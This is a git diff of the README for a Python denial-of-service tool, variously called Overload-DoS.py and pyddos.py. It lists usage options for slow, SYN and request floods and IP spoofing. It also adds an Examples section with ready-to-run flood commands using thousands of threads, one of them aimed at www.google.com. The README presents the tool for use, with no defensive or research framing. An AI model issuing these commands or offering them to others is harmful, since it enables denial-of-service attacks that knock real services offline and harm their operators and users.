@@ -37,7 +37,7 @@ chmod +x *
 ```
 ./install-overload
 ```
-## Commands
+## Usages
 ```
 usage: ./Overload-DoS.py -t [target] -p [port] -t [number threads]
 
@@ -57,7 +57,16 @@ options:
   -slow                Enable slow attack
   -fakeip              Option to create fake ip if not specifed for spoofed ip
 ```
-
+## Examples
+```
+./pyddos.py -target www.example.com -port 80 -threads 2000 -slow
+```
+```
+./pyddos.py -target www.domain.com -sleep 100 -request
+```
+```
+./pyddos.py -target www.google.com -syn -threads 5000 -timeout 10.0
+```
 ## Built With
 
 * [Python 2.7](https://www.python.org/download/releases/2.7/) - The code framework used
